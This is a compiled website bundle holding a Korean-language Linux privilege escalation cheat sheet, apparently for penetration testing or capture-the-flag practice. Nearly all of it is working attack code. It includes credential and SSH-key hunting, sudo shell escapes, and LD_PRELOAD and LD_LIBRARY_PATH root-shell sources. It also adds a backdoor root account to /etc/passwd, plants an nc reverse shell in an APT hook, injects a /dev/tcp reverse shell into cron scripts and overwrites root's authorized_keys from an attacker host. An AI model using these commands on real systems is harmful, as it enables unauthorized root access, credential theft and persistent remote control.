"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[6354],{28453:(n,e,s)=>{s.d(e,{R:()=>d,x:()=>c});var l=s(96540);const i={},a=l.createContext(i);function d(n){const e=l.useContext(a);return l.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:d(n.components),l.createElement(a.Provider,{value:e},n.children)}},41848:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>r,contentTitle:()=>c,default:()=>o,frontMatter:()=>d,metadata:()=>l,toc:()=>t});const l=JSON.parse('{"id":"cheatsheet/privilege-escalation/linux","title":"Linux Privilege Escalation","description":"Linux \uc2dc\uc2a4\ud15c\uc5d0\uc11c\uc758 \uad8c\ud55c \uc0c1\uc2b9 \uae30\ubc95\uc785\ub2c8\ub2e4.","source":"@site/docs/cheatsheet/privilege-escalation/linux.md","sourceDirName":"cheatsheet/privilege-escalation","slug":"/cheatsheet/privilege-escalation/linux","permalink":"/my-docusaurus-page/cheatsheet/privilege-escalation/linux","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"Privilege Escalation","permalink":"/my-docusaurus-page/category/privilege-escalation"},"next":{"title":"Windows Privilege Escalation","permalink":"/my-docusaurus-page/cheatsheet/privilege-escalation/windows"}}');var i=s(74848),a=s(28453);const d={sidebar_position:1},c="Linux Privilege Escalation",r={},t=[{value:"\uae30\ubcf8 \uc5f4\uac70",id:"\uae30\ubcf8-\uc5f4\uac70",level:2},{value:"SUID/SGID \ud30c\uc77c",id:"suidsgid-\ud30c\uc77c",level:2},{value:"Capabilities",id:"capabilities",level:2},{value:"\uc4f0\uae30 \uac00\ub2a5\ud55c \ud30c\uc77c/\ub514\ub809\ud1a0\ub9ac",id:"\uc4f0\uae30-\uac00\ub2a5\ud55c-\ud30c\uc77c\ub514\ub809\ud1a0\ub9ac",level:2},{value:"\uc790\uaca9\uc99d\uba85 \uc218\uc9d1",id:"\uc790\uaca9\uc99d\uba85-\uc218\uc9d1",level:2},{value:"CentOS",id:"centos",level:2},{value:"sudo \uc545\uc6a9",id:"sudo-\uc545\uc6a9",level:2},{value:"sudo -l \ud655\uc778",id:"sudo--l-\ud655\uc778",level:3},{value:"GTFOBins",id:"gtfobins",level:3},{value:"PATH Hijacking",id:"path-hijacking",level:2},{value:"LD_PRELOAD",id:"ld_preload",level:2},{value:"shell.c",id:"shellc",level:3},{value:"\ucef4\ud30c\uc77c",id:"\ucef4\ud30c\uc77c",level:3},{value:"\uad8c\ud55c \uc0c1\uc2b9",id:"\uad8c\ud55c-\uc0c1\uc2b9",level:3},{value:"LD_LIBRARY_PATH",id:"ld_library_path",level:2},{value:"shell.c",id:"shellc-1",level:3},{value:"\ucef4\ud30c\uc77c",id:"\ucef4\ud30c\uc77c-1",level:3},{value:"Bash \ucde8\uc57d\uc810",id:"bash-\ucde8\uc57d\uc810",level:2},{value:"Bash Debugging Mode",id:"bash-debugging-mode",level:3},{value:"Bash Functions",id:"bash-functions",level:3},{value:"\ube44\ubc00\ubc88\ud638 \uc778\uc99d \uc545\uc6a9",id:"\ube44\ubc00\ubc88\ud638-\uc778\uc99d-\uc545\uc6a9",level:2},{value:"\ud2b9\uc815 \ubc14\uc774\ub108\ub9ac \uc545\uc6a9",id:"\ud2b9\uc815-\ubc14\uc774\ub108\ub9ac-\uc545\uc6a9",level:2},{value:"Apache2",id:"apache2",level:3},{value:"APT",id:"apt",level:3},{value:"aria2c",id:"aria2c",level:3},{value:"Kernel Exploits",id:"kernel-exploits",level:2},{value:"Cron Jobs",id:"cron-jobs",level:2},{value:"NFS",id:"nfs",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function h(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.header,{children:(0,i.jsx)(e.h1,{id:"linux-privilege-escalation",children:"Linux Privilege Escalation"})}),"\n",(0,i.jsx)(e.p,{children:"Linux \uc2dc\uc2a4\ud15c\uc5d0\uc11c\uc758 \uad8c\ud55c \uc0c1\uc2b9 \uae30\ubc95\uc785\ub2c8\ub2e4."}),"\n",(0,i.jsx)(e.h2,{id:"\uae30\ubcf8-\uc5f4\uac70",children:"\uae30\ubcf8 \uc5f4\uac70"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# \ud604\uc7ac \uc0ac\uc6a9\uc790 \uc815\ubcf4\nid\nwhoami\n\n# sudo \uad8c\ud55c \ud655\uc778\nsudo -l\n\n# \ud658\uacbd \ubcc0\uc218\nenv\nprintenv\n\n# bashrc/bash_profile\ncat ~/.bashrc\ncat ~/.bash_profile\ncat /etc/profile\n\n# \uc0ac\uc6a9\uc790 \uacc4\uc815\ncat /etc/passwd\ncat /etc/shadow  # root\ub9cc \uac00\ub2a5\n\n# \uadf8\ub8f9\ncat /etc/group\ngroups\n\n# \ud638\uc2a4\ud2b8 \uc815\ubcf4\ncat /etc/hosts\nhostname\n\n# \ud30c\uc77c \uc2dc\uc2a4\ud15c\ncat /etc/fstab\nmount\ndf -h\n\n# \ube14\ub85d \ub514\ubc14\uc774\uc2a4\nlsblk\n\n# Cron \uc791\uc5c5\nls -lah /etc/cron*\ncrontab -l\nsudo crontab -l\ncrontab -u <USERNAME> -l\ngrep "CRON" /var/log/syslog\ncat /etc/crontab\n\n# \ub124\ud2b8\uc6cc\ud06c\nss -tulpn\nnetstat -tulpn\nip addr\nifconfig\n\n# \ud504\ub85c\uc138\uc2a4\nps -auxf\nps aux\nps -ef\n\n# \uc2dc\uc2a4\ud15c \uc815\ubcf4\nuname -a\ncat /etc/os-release\ncat /etc/issue\nlsb_release -a\n\n# \uc124\uce58\ub41c \ud328\ud0a4\uc9c0\ndpkg -l  # Debian/Ubuntu\nrpm -qa  # RedHat/CentOS\n'})}),"\n",(0,i.jsx)(e.h2,{id:"suidsgid-\ud30c\uc77c",children:"SUID/SGID \ud30c\uc77c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# SUID \ud30c\uc77c \ucc3e\uae30\nfind / -perm -4000 2>/dev/null\nfind / -type f -user root -perm -4000 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\n\n# SGID \ud30c\uc77c \ucc3e\uae30\nfind / -perm -2000 2>/dev/null\n\n# SUID + SGID \ubaa8\ub450\nfind / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2>/dev/null\n\n# \uc77c\ubc18\uc801\uc778 SUID \ubc14\uc774\ub108\ub9ac\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/su\n"})}),"\n",(0,i.jsx)(e.h2,{id:"capabilities",children:"Capabilities"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Capabilities \ud655\uc778\ncapsh --print\n\n# \ud30c\uc77c Capabilities \ucc3e\uae30\n/usr/sbin/getcap -r / 2>/dev/null\ngetcap -r / 2>/dev/null\n\n# \uc77c\ubc18\uc801\uc73c\ub85c \uc704\ud5d8\ud55c Capabilities\n# cap_setuid\n# cap_dac_override\n# cap_dac_read_search\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\uc4f0\uae30-\uac00\ub2a5\ud55c-\ud30c\uc77c\ub514\ub809\ud1a0\ub9ac",children:"\uc4f0\uae30 \uac00\ub2a5\ud55c \ud30c\uc77c/\ub514\ub809\ud1a0\ub9ac"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# \uc4f0\uae30 \uac00\ub2a5\ud55c \ub514\ub809\ud1a0\ub9ac\nfind / -writable -type d 2>/dev/null\nfind / -perm -222 -type d 2>/dev/null\n\n# \uc4f0\uae30 \uac00\ub2a5\ud55c \ud30c\uc77c\nfind / -writable -type f 2>/dev/null\n\n# /etc \ub0b4 \uc4f0\uae30 \uac00\ub2a5\ud55c \ud30c\uc77c\nfind /etc -writable -type f 2>/dev/null\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\uc790\uaca9\uc99d\uba85-\uc218\uc9d1",children:"\uc790\uaca9\uc99d\uba85 \uc218\uc9d1"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# \ube44\ubc00\ubc88\ud638 \uac80\uc0c9\ngrep -R "password" / 2>/dev/null\ngrep -R db_passwd / 2>/dev/null\ngrep -roiE "password.{20}" / 2>/dev/null\ngrep -oiE "password.{20}" /etc/*.conf\n\n# \ud788\uc2a4\ud1a0\ub9ac\ncat ~/.bash_history\ncat ~/.mysql_history\ncat ~/.psql_history\n\n# SSH \ud0a4\nfind / -name id_rsa 2>/dev/null\nfind / -name id_dsa 2>/dev/null\nfind / -name authorized_keys 2>/dev/null\n\n# \uc124\uc815 \ud30c\uc77c\nfind /var/www -name "*.php" -exec grep -i "password\\|passwd" {} \\; 2>/dev/null\nfind / -name config.php 2>/dev/null\nfind / -name wp-config.php 2>/dev/null\n\n# \uc2e4\uc2dc\uac04 \ud504\ub85c\uc138\uc2a4 \ubaa8\ub2c8\ud130\ub9c1\nwatch -n 1 "ps -aux | grep pass"\n\n# \ub124\ud2b8\uc6cc\ud06c \ud2b8\ub798\ud53d \ucea1\ucc98\nsudo tcpdump -i lo -A | grep "pass"\n'})}),"\n",(0,i.jsx)(e.h2,{id:"centos",children:"CentOS"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# doas\ub97c \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9\ndoas -u <USERNAME> /bin/sh\ndoas -u root /bin/bash\n"})}),"\n",(0,i.jsx)(e.h2,{id:"sudo-\uc545\uc6a9",children:"sudo \uc545\uc6a9"}),"\n",(0,i.jsx)(e.h3,{id:"sudo--l-\ud655\uc778",children:"sudo -l \ud655\uc778"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"sudo -l\n\n# (ALL : ALL) ALL - \ubaa8\ub4e0 \uba85\ub839\uc5b4 \uac00\ub2a5\n# (root) NOPASSWD: /usr/bin/find - find\ub97c \ube44\ubc00\ubc88\ud638 \uc5c6\uc774 root\ub85c \uc2e4\ud589\n"})}),"\n",(0,i.jsx)(e.h3,{id:"gtfobins",children:"GTFOBins"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# find\nsudo find . -exec /bin/sh \\; -quit\n\n# vim\nsudo vim -c ':!/bin/sh'\n\n# less\nsudo less /etc/profile\n!/bin/sh\n\n# python\nsudo python -c 'import os; os.system(\"/bin/sh\")'\n\n# perl\nsudo perl -e 'exec \"/bin/sh\";'\n\n# awk\nsudo awk 'BEGIN {system(\"/bin/sh\")}'\n"})}),"\n",(0,i.jsx)(e.h2,{id:"path-hijacking",children:"PATH Hijacking"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# sudo -l\uc5d0\uc11c NOPASSWD \ud655\uc778\nsudo -l\n\n# \ud658\uacbd \ubcc0\uc218\uac00 \uc720\uc9c0\ub418\ub294\uc9c0 \ud655\uc778\n# env_keep+=LD_PRELOAD\n# env_keep+=LD_LIBRARY_PATH\n\n# PATH\uc5d0 \ud604\uc7ac \ub514\ub809\ud1a0\ub9ac \ucd94\uac00\necho $PATH\nexport PATH=.:$PATH\n\n# \uc545\uc131 \ubc14\uc774\ub108\ub9ac \uc0dd\uc131\necho '/bin/bash' > <BINARY_NAME>\nchmod +x <BINARY_NAME>\n\n# \uc2e4\ud589\nsudo ./<BINARY_NAME>\n"})}),"\n",(0,i.jsx)(e.h2,{id:"ld_preload",children:"LD_PRELOAD"}),"\n",(0,i.jsx)(e.h3,{id:"shellc",children:"shell.c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-c",children:'#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv("LD_PRELOAD");\n    setgid(0);\n    setuid(0);\n    system("/bin/bash");\n}\n'})}),"\n",(0,i.jsx)(e.h3,{id:"\ucef4\ud30c\uc77c",children:"\ucef4\ud30c\uc77c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"gcc -fPIC -shared -o shell.so shell.c -nostartfiles\n"})}),"\n",(0,i.jsx)(e.h3,{id:"\uad8c\ud55c-\uc0c1\uc2b9",children:"\uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"sudo LD_PRELOAD=/path/to/shell.so <BINARY>\n"})}),"\n",(0,i.jsx)(e.h2,{id:"ld_library_path",children:"LD_LIBRARY_PATH"}),"\n",(0,i.jsx)(e.h3,{id:"shellc-1",children:"shell.c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-c",children:'#include <stdio.h>\n#include <stdlib.h>\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n    unsetenv("LD_LIBRARY_PATH");\n    setgid(0);\n    setuid(0);\n    system("/bin/bash -p");\n}\n'})}),"\n",(0,i.jsx)(e.h3,{id:"\ucef4\ud30c\uc77c-1",children:"\ucef4\ud30c\uc77c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# \ub77c\uc774\ube0c\ub7ec\ub9ac \ud655\uc778\nldd /usr/sbin/<BINARY>\n\n# \ucef4\ud30c\uc77c\ngcc -o <LIBRARY>.so.<VERSION> -shared -fPIC shell.c\n\n# \uc2e4\ud589\nsudo LD_LIBRARY_PATH=. <BINARY>\n"})}),"\n",(0,i.jsx)(e.h2,{id:"bash-\ucde8\uc57d\uc810",children:"Bash \ucde8\uc57d\uc810"}),"\n",(0,i.jsx)(e.h3,{id:"bash-debugging-mode",children:"Bash Debugging Mode"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Bash < 4.4\nenv -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>\n"})}),"\n",(0,i.jsx)(e.h3,{id:"bash-functions",children:"Bash Functions"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Bash < 4.2-048\nfunction /usr/sbin/<BINARY> { /bin/bash -p; }\nexport -f /usr/sbin/<BINARY>\n/usr/sbin/<BINARY>\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\ube44\ubc00\ubc88\ud638-\uc778\uc99d-\uc545\uc6a9",children:"\ube44\ubc00\ubc88\ud638 \uc778\uc99d \uc545\uc6a9"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# /etc/passwd\uc5d0 \uc0c8 \uc0ac\uc6a9\uc790 \ucd94\uac00\nopenssl passwd <PASSWORD>\n# \ucd9c\ub825: FgKl.eqJO6s2g\n\necho "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd\nsu root2\n'})}),"\n",(0,i.jsx)(e.h2,{id:"\ud2b9\uc815-\ubc14\uc774\ub108\ub9ac-\uc545\uc6a9",children:"\ud2b9\uc815 \ubc14\uc774\ub108\ub9ac \uc545\uc6a9"}),"\n",(0,i.jsx)(e.h3,{id:"apache2",children:"Apache2"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# apache2\ub85c \ud30c\uc77c \uccab \uc904 \uc77d\uae30\nsudo /usr/sbin/apache2 -f /etc/shadow\nsudo /usr/sbin/apache2 -f /root/.ssh/id_rsa\n"})}),"\n",(0,i.jsx)(e.h3,{id:"apt",children:"APT"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# APT Pre-Invoke \ud6c5 \uc545\uc6a9\necho 'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f\"};' > /etc/apt/apt.conf.d/shell\n\nsudo apt update\n"})}),"\n",(0,i.jsx)(e.h3,{id:"aria2c",children:"aria2c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# authorized_keys \ub36e\uc5b4\uc4f0\uae30\naria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true\n'})}),"\n",(0,i.jsx)(e.h2,{id:"kernel-exploits",children:"Kernel Exploits"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# \ucee4\ub110 \ubc84\uc804 \ud655\uc778\nuname -a\ncat /proc/version\n\n# \uc775\uc2a4\ud50c\ub85c\uc787 \uac80\uc0c9\nsearchsploit linux kernel <VERSION>\n\n# \uc77c\ubc18\uc801\uc778 Kernel Exploits\n# DirtyCow (CVE-2016-5195)\n# PwnKit (CVE-2021-4034)\n"})}),"\n",(0,i.jsx)(e.h2,{id:"cron-jobs",children:"Cron Jobs"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Cron \ud30c\uc77c \ud655\uc778\nls -la /etc/cron*\ncat /etc/crontab\ncrontab -l\n\n# \uc4f0\uae30 \uac00\ub2a5\ud55c Cron \uc2a4\ud06c\ub9bd\ud2b8 \ucc3e\uae30\nfind /etc/cron* -writable 2>/dev/null\n\n# Cron \uc2a4\ud06c\ub9bd\ud2b8\uc5d0 \ub9ac\ubc84\uc2a4 \uc258 \uc0bd\uc785\necho 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /path/to/script.sh\n"})}),"\n",(0,i.jsx)(e.h2,{id:"nfs",children:"NFS"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# NFS \uacf5\uc720 \ud655\uc778\ncat /etc/exports\n\n# no_root_squash\uac00 \uc124\uc815\ub41c \uacbd\uc6b0\n# LHOST\uc5d0\uc11c:\nmkdir /tmp/nfs\nmount -o rw,vers=3 <RHOST>:/share /tmp/nfs\ncd /tmp/nfs\n\n# SUID \ubc14\uc774\ub108\ub9ac \uc0dd\uc131\ncat > shell.c << EOF\n#include <unistd.h>\nint main() {\n    setuid(0);\n    setgid(0);\n    system("/bin/bash");\n}\nEOF\n\ngcc shell.c -o shell\nchmod +s shell\n\n# RHOST\uc5d0\uc11c:\n/share/shell\n'})}),"\n",(0,i.jsx)(e.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"GTFOBins"}),": ",(0,i.jsx)(e.a,{href:"https://gtfobins.github.io/",children:"https://gtfobins.github.io/"})]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"LinPEAS"}),": \uc790\ub3d9\ud654\ub41c Linux \uad8c\ud55c \uc0c1\uc2b9 \uc2a4\ud06c\ub9bd\ud2b8"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"LinEnum"}),": Linux \uc5f4\uac70 \uc2a4\ud06c\ub9bd\ud2b8"]}),"\n",(0,i.jsx)(e.li,{children:"\ud56d\uc0c1 \uc5ec\ub7ec \ubca1\ud130 \ud655\uc778"}),"\n",(0,i.jsx)(e.li,{children:"\uc790\ub3d9\ud654 \ub3c4\uad6c\uc640 \uc218\ub3d9 \uc810\uac80 \ubcd1\ud589"}),"\n"]})]})}function o(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(h,{...n})}):h(n)}}}]);